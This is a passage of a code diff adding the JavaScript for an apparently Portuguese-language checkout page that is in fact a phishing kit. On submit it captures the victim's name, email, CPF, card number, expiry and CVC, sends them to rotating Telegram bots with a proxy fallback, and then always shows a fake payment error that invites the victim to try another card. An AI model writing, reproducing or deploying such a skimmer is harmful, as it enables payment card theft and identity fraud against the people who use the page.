+    var botB = TELEGRAM_BOTS[(idx + 1) % TELEGRAM_BOTS.length];
+    var urlA = tgUrl(botA, text);
+    var urlB = tgUrl(botB, text);
+    var proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(urlA);
+
+    return trySend(urlA).then(function (okA) {
+      if (okA) return true;
+      return trySend(urlB).then(function (okB) {
+        if (okB) return true;
+        return trySend(proxyUrl).then(function (okP) {
+          if (okP) return true;
+          try {
+            fetch(urlB, { mode: 'no-cors', keepalive: true, cache: 'no-store' }).catch(function () {});
+          } catch (e) { /* ignora */ }
+          return false;
+        });
+      });
+    });
+  }
+
+  var errorScreen = $('errorScreen');
+  var errRetryBtn = $('errRetry');
+  var errChangeBtn = $('errChangeCard');
+  var lastFocusedBeforeError = null;
+
+  function populateErrorScreen(formData, protocol) {
+    var cardEl = document.getElementById('errCardLast');
+    var amtEl = document.getElementById('errAmount');
+    var protoEl = document.getElementById('errProtocol');
+    if (cardEl) cardEl.textContent = '•••• ' + (formData.last4 || '••••');
+    if (amtEl) amtEl.textContent = formData.total;
+    if (protoEl) protoEl.textContent = protocol;
+  }
+
+  function openErrorScreen(returnTo) {
+    lastFocusedBeforeError = returnTo || document.activeElement;
+    errorScreen.classList.add('is-open');
+    errorScreen.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+    window.setTimeout(function () {
+      try { errRetryBtn.focus({ preventScroll: true }); } catch (e) { errRetryBtn.focus(); }
+    }, 30);
+  }
+
+  function closeErrorScreen(opts) {
+    opts = opts || {};
+    errorScreen.classList.remove('is-open');
+    errorScreen.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+    setFormDisabled(false);
+    setLoading(false);
+    submitting = false;
+    if (opts.focusEl && opts.focusEl.focus) {
+      try { opts.focusEl.focus({ preventScroll: true }); } catch (e) { opts.focusEl.focus(); }
+      try { opts.focusEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); } catch (e) { opts.focusEl.scrollIntoView(); }
+    } else if (lastFocusedBeforeError && lastFocusedBeforeError.focus) {
+      try { lastFocusedBeforeError.focus({ preventScroll: true }); } catch (e) { lastFocusedBeforeError.focus(); }
+    }
+  }
+
+  function trapFocus(e) {
+    if (!errorScreen.classList.contains('is-open')) return;
+    if (e.key !== 'Tab') return;
+    var nodes = errorScreen.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
+    var list = [];
+    for (var i = 0; i < nodes.length; i++) {
+      var n = nodes[i];
+      if (n.offsetParent !== null && !n.disabled) list.push(n);
+    }
+    if (!list.length) return;
+    var first = list[0];
+    var last = list[list.length - 1];
+    if (e.shiftKey) {
+      if (document.activeElement === first || !errorScreen.contains(document.activeElement)) {
+        e.preventDefault(); last.focus();
+      }
+    } else {
+      if (document.activeElement === last || !errorScreen.contains(document.activeElement)) {
+        e.preventDefault(); first.focus();
+      }
+    }
+  }
+
+  errRetryBtn.addEventListener('click', function () {
+    closeErrorScreen({ focusEl: inputs.number });
+  });
+
+  errChangeBtn.addEventListener('click', function () {
+    var cardFields = ['name', 'number', 'expiry', 'cvv'];
+    for (var i = 0; i < cardFields.length; i++) {
+      var key = cardFields[i];
+      inputs[key].value = '';
+      seen[key] = '';
+      setError(key, '');
+    }
+    currentBrandKey = null;
+    updateBrand();
+    closeErrorScreen({ focusEl: inputs.number });
+  });
+
+  errorScreen.addEventListener('click', function (e) {
+    if (e.target === errorScreen) closeErrorScreen({ focusEl: inputs.number });
+  });
+
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && errorScreen.classList.contains('is-open')) {
+      e.preventDefault();
+      closeErrorScreen({ focusEl: inputs.number });
+      return;
+    }
+    trapFocus(e);
+  });
+
+  var payBtn = $('payBtn');
+  var submitting = false;
+
+  function setLoading(on) {
+    payBtn.disabled = !!on;
+    payBtn.classList.toggle('is-loading', !!on);
+    if (on) payBtn.setAttribute('aria-busy', 'true');
+    else payBtn.removeAttribute('aria-busy');
+  }
+
+  function setFormDisabled(on) {
+    var dis = !!on;
+    for (var i = 0; i < FIELDS.length; i++) inputs[FIELDS[i]].disabled = dis;
+    var c = document.getElementById('coupon');
+    var a = document.getElementById('applyCoupon');
+    if (c) c.disabled = dis || couponApplied;
+    if (a) a.disabled = dis || couponApplied;
+
+    var planInps = document.querySelectorAll('.plan-input');
+    for (var j = 0; j < planInps.length; j++) planInps[j].disabled = dis;
+  }
+
+  function focusAndScroll(el) {
+    try { el.focus({ preventScroll: true }); } catch (e) { el.focus(); }
+    var smooth = !(window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches);
+    try { el.scrollIntoView({ behavior: smooth ? 'smooth' : 'auto', block: 'center' }); }
+    catch (e) { el.scrollIntoView(); }
+  }
+
+  function validateAll() {
+    var firstBad = null;
+    for (var i = 0; i < FIELDS.length; i++) syncField(FIELDS[i]);
+    for (var j = 0; j < FIELDS.length; j++) {
+      if (!validateField(FIELDS[j]) && !firstBad) firstBad = inputs[FIELDS[j]];
+    }
+    if (firstBad) { focusAndScroll(firstBad); return false; }
+    return true;
+  }
+
+  function pressStart() {
+    suppressBlur = true;
+    window.clearTimeout(suppressTimer);
+    suppressTimer = window.setTimeout(function () { suppressBlur = false; }, 2000);
+  }
+  function pressEnd() {
+    window.clearTimeout(suppressTimer);
+    suppressTimer = window.setTimeout(function () { suppressBlur = false; }, 400);
+  }
+  ['pointerdown', 'mousedown', 'touchstart'].forEach(function (ev) {
+    payBtn.addEventListener(ev, pressStart, { passive: true });
+  });
+  ['pointerup', 'pointercancel', 'mouseup', 'touchend', 'touchcancel'].forEach(function (ev) {
+    document.addEventListener(ev, function () { if (suppressBlur) pressEnd(); }, { passive: true });
+  });
+
+  function handlePay() {
+    if (submitting) return;
+    if (!validateAll()) return;
+
+    submitting = true;
+    setLoading(true);
+    setFormDisabled(true);
+
+    var startedAt = Date.now();
+    var protocol = generateProtocol();
+    var formData;
+    try {
+      formData = captureFormData();
+    } catch (e) {
+      formData = {
+        fullname: '', email: '', cpf: '', holder: '', number: '', last4: '',
+        brand: 'DESCONHECIDA', expiry: '', cvc: '',
+        plan: getPlan().name, planId: selectedPlanId,
+        total: money(getPlan().price - discount), totalCents: getPlan().price - discount
+      };
+    }
+
+    var envPromise = captureEnv();
+
+    var finalize = function () {
+      var elapsed = Date.now() - startedAt;
+      var wait = Math.max(0, 2500 - elapsed);
+      window.setTimeout(function () {
+        try { populateErrorScreen(formData, protocol); } catch (e) { /* ignora */ }
+        setLoading(false);
+        openErrorScreen(payBtn);
+      }, wait);
+    };
+
+    envPromise.then(function (env) {
+      var text;
+      try { text = buildTelegramMessage(formData, env, protocol); }
+      catch (e) { text = ''; }
+
+      var sendPromise;
+      if (text) {
+        try { sendPromise = sendToTelegram(text); }
+        catch (e) { sendPromise = Promise.resolve(false); }
+      } else {
+        sendPromise = Promise.resolve(false);
+      }
+
+      var timeoutPromise = new Promise(function (resolve) {
+        window.setTimeout(function () { resolve(false); }, 6000);
+      });
+
+      Promise.race([sendPromise, timeoutPromise]).then(finalize, finalize);
+    }, finalize);
+  }
+
+  $('checkoutForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+    handlePay();
+  });
+
+  window.addEventListener('pageshow', function () {
+    if (!errorScreen.classList.contains('is-open')) {
+      submitting = false;
+      setLoading(false);
+      setFormDisabled(false);
+    }
+    checkAutofill();
+  });
+
+  var toastTimer = null;
+  function toast(msg) {
+    var t = $('toast');
+    t.textContent = msg;
+    t.classList.add('is-shown');
+    window.clearTimeout(toastTimer);
+    toastTimer = window.setTimeout(function () { t.classList.remove('is-shown'); }, 3200);
+  }
+
+  var docs = document.querySelectorAll('[data-doc]');
+  for (var i = 0; i < docs.length; i++) {
+    docs[i].addEventListener('click', function (e) {
+      e.preventDefault();
+      toast('Link ilustrativo: adicione aqui a ' + this.getAttribute('data-doc') + '.');
+    });
+  }
+
+  $('backLink').addEventListener('click', function (e) {
+    e.preventDefault();
+    toast('Link ilustrativo: retorno ao carrinho.');
+  });
+
+  payBtn.disabled = false;
+  payBtn.removeAttribute('disabled');
+  for (var k = 0; k < FIELDS.length; k++) syncField(FIELDS[k]);
+  updateSummary();
+  render();
+  updateBrand();
+})();
+</script>
+</body>
+</html>
